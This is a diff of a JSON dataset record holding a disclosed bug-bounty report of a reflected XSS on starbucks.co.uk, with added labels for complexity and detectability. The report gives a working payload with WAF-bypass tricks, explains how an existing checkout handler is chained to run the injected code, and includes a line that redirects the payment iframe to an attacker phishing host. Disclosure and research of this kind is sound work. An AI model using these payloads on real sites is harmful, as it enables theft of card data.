@@ -1,54 +1,58 @@
 {
-    "reported_to": "Starbucks",
-    "reported_by": "bayotop ",
-    "title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)",
-    "content": "\nHi,\nSteps to reproduce:\nRun Firefox (these steps require Firefox).\nLog in on https://www.starbucks.co.uk/account/signin\nGo to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\nGo to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\nAfter the page finishes loading click the \"Checkout\" title.\nA confirmation prompt is shown showing the current domain.\nNote that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\nDescription:\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected\nLooking at the source code you see the whole URL is reflected in a link tag.\nCode 85 Bytes\n1<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" />\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in:\nCode 90 Bytes\n1<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" />\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy script loaded into the page that does the following:\nCode 88 Bytes\n1$(\"#checkout\").bind(\"click\", function(e) {\n2    $(\"#checkoutButton\").trigger(\"click\")\n3});\nYou see where this is going. In case I find a page that has an element with the id checkout, I can inject id=\"checkoutButton\" onclick=\"malicous_js\" to the above link element and the injected JS will be executed once the checkout element is clicked.\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\nCode 131 Bytes\n1document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\nNote that the checkout element is actually <body> so there is plenty of space where the user can click to execute the malicious JS.\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n== -> used to trick the query string parsing code that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n%u0022 -> bypasses the WAF that is causing a 404 when the query contains \"%22\".\na%20onclick= -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\nconfirm(/-/g -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n+this.ownerDocument.domain) -> the WAF doesn't like \"document\".\nImpact\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\nRecommendation\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Starbucks",
+  "reported_by": "bayotop ",
+  "title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)",
+  "content": "\nHi,\nSteps to reproduce:\nRun Firefox (these steps require Firefox).\nLog in on https://www.starbucks.co.uk/account/signin\nGo to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\nGo to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\nAfter the page finishes loading click the \"Checkout\" title.\nA confirmation prompt is shown showing the current domain.\nNote that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\nDescription:\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected\nLooking at the source code you see the whole URL is reflected in a link tag.\nCode 85 Bytes\n1<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" />\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in:\nCode 90 Bytes\n1<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" />\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy script loaded into the page that does the following:\nCode 88 Bytes\n1$(\"#checkout\").bind(\"click\", function(e) {\n2    $(\"#checkoutButton\").trigger(\"click\")\n3});\nYou see where this is going. In case I find a page that has an element with the id checkout, I can inject id=\"checkoutButton\" onclick=\"malicous_js\" to the above link element and the injected JS will be executed once the checkout element is clicked.\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\nCode 131 Bytes\n1document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\nNote that the checkout element is actually <body> so there is plenty of space where the user can click to execute the malicious JS.\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n== -> used to trick the query string parsing code that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n%u0022 -> bypasses the WAF that is causing a 404 when the query contains \"%22\".\na%20onclick= -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\nconfirm(/-/g -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n+this.ownerDocument.domain) -> the WAF doesn't like \"document\".\nImpact\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\nRecommendation\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1527040200,
+  "report_url": "https://hackerone.com/reports/227486",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Log in on https://www.starbucks.co.uk/account/signin"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Generic"
+    [
+      2,
+      "Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket."
     ],
-    "screenshots": {},
-    "disclosed_date": 1527040200,
-    "report_url": "https://hackerone.com/reports/227486",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Log in on https://www.starbucks.co.uk/account/signin"
-        ],
-        [
-            2,
-            "Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket."
-        ],
-        [
-            3,
-            "Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton"
-        ],
-        [
-            4,
-            "After the page finishes loading click the 'Checkout' title."
-        ],
-        [
-            5,
-            "A confirmation prompt is shown showing the current domain."
-        ]
+    [
+      3,
+      "Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton"
     ],
-    "vuln_description": "This vulnerability is a reflected XSS on the Starbucks UK website that can lead to credit card theft. The attack involves injecting malicious attributes into a link element via URL parameters, which then triggers JavaScript execution when a user interacts with the checkout button. This can be exploited to redirect users to a phishing site mimicking the Starbucks payment page, potentially stealing credit card information.",
-    "reason": "The attack involves multiple components including URL parameter manipulation, WAF bypass techniques, and leveraging existing JavaScript functionality to trigger the XSS. The attacker must understand the application's behavior, the WAF's filtering rules, and how to chain these elements together to achieve code execution. The subtle interaction between the injected attributes and the existing JavaScript event handlers adds to the complexity.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The XSS vulnerability involves injecting malicious attributes into a reflected URL parameter, which is then used to execute arbitrary JavaScript when a user interacts with the page. This does not directly involve authentication or authorization bypass via session or resource ID manipulation, but rather exploits a client-side injection flaw. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which is not applicable here as the vulnerability stems from improper input sanitization and output encoding.",
-        "is_detectable": false
-    }
+    [
+      4,
+      "After the page finishes loading click the 'Checkout' title."
+    ],
+    [
+      5,
+      "A confirmation prompt is shown showing the current domain."
+    ]
+  ],
+  "vuln_description": "This vulnerability is a reflected XSS on the Starbucks UK website that can lead to credit card theft. The attack involves injecting malicious attributes into a link element via URL parameters, which then triggers JavaScript execution when a user interacts with the checkout button. This can be exploited to redirect users to a phishing site mimicking the Starbucks payment page, potentially stealing credit card information.",
+  "reason": "The attack involves multiple components including URL parameter manipulation, WAF bypass techniques, and leveraging existing JavaScript functionality to trigger the XSS. The attacker must understand the application's behavior, the WAF's filtering rules, and how to chain these elements together to achieve code execution. The subtle interaction between the injected attributes and the existing JavaScript event handlers adds to the complexity.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability involves injecting malicious attributes into a reflected URL parameter, which is then used to execute arbitrary JavaScript when a user interacts with the page. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, but does not specifically address DOM-based XSS or reflected XSS vulnerabilities that rely on injecting malicious input into the page. Therefore, this specific XSS vulnerability would not be detected by the described methodology.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The vulnerability relies on multiple nuanced bypass techniques (Unicode encoding, WAF filter evasion via payload structure, and DOM event handler chaining) that require context-aware payloads. The methodology's 'simple payload list' explicitly excludes custom filter bypasses and contextual DOM knowledge. While the injectable parameter might be discovered through step 3, the required payload syntax (%u0022 encoding, onclick handler placement, and JS execution via checkout flow) exceeds 'simple' payload definitions as they require application-specific bypass research.",
+    "is_simple_injection": false
+  }
 }
